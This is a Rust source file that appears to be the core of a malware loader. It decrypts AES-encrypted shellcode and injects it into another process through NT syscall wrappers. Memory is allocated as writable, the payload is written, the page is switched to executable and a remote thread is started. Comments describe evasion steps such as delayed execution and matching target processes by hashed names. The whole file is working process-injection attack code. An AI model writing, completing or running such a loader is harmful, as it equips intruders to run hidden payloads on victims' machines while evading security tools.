use libaes::Cipher;

// Importing shellcode variables from shellcode.rs
mod shellcode;
use shellcode::{SHELLCODE, KEY, INITVEC};

// Importing required syscall wrappers from syscall.rs:
mod syscalls;
use syscalls::*;

struct EncryptedShellcode<'a> {
    shellcode: &'a[u8],
    key: [u8; 32],
    iv: [u8; 16],
}

impl EncryptedShellcode<'_> { 
    fn decrypt(&self) -> Vec<u8> {
        let cipher = Cipher::new_256(&self.key);
        cipher.cbc_decrypt(&self.iv, &self.shellcode)
    }
}


// The current execution flow idea is as follows:
// This program starts, it sleeps for 30 seconds.
// After sleeping, it'll look for a specified process 
// by matching hashed names against a hash.
// If it finds the specified process, it'll allocate
// a new block of WRITE space, where it´ll write and drop a payload.
// Now, after sleeping for 10 seconds, this will turn the page to EXECUTE
// and start the thread execution. Now, we close the handle(s) and continue our lives.

fn main() {
    let encrypted_payload = EncryptedShellcode{
        shellcode: SHELLCODE, 
        key: KEY, 
        iv: INITVEC
    };
    let payload = encrypted_payload.decrypt();
    
    let current_process_pid = enumerate_processes().unwrap();
    //let args: Vec<String> = env::args().collect();
    let current_process_handle = nt_get_handle(*current_process_pid.last().unwrap()).unwrap();
    //let current_process_handle = nt_get_handle(args[1].parse::<usize>().unwrap()).unwrap();
    // Let's allocate the required memory:
    
    let addr_space = nt_virtual_alloc(
        *current_process_handle, 
        None, 
        Some(0x04),
        Some(payload.len()),
        None
    ).unwrap();


    // Let's write the buffer:
    nt_write_process_memory(*current_process_handle, addr_space as usize, payload.to_vec());

    //virtual_protect_ex(*current_process_handle, addr_space, payload.len());
    nt_virtual_protect_ex(*current_process_handle, addr_space, payload.len(), 0x10);

    nt_create_remote_thread_ex(*current_process_handle, addr_space);
    // Sleep to make sure the injection was succesful.
    use std::{thread, time};
    let ten_millis = time::Duration::from_millis(100);
    thread::sleep(ten_millis);
    /*
    let variable_to_read = 100u8;
    let variable_location = &variable_to_read as *const _ as *const c_void;
    let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);
    nt_write_process_memory(*current_process_handle, variable_location as usize, vec![64u8]);
    let buff = nt_read_process_memory(*current_process_handle, variable_location as usize, 1);

    
    let addr_space = nt_virtual_alloc(*current_process_handle, None, None).unwrap();
    nt_virtual_alloc(*current_process_handle, Some(addr_space as usize), Some(0x20)); 
     */    
}
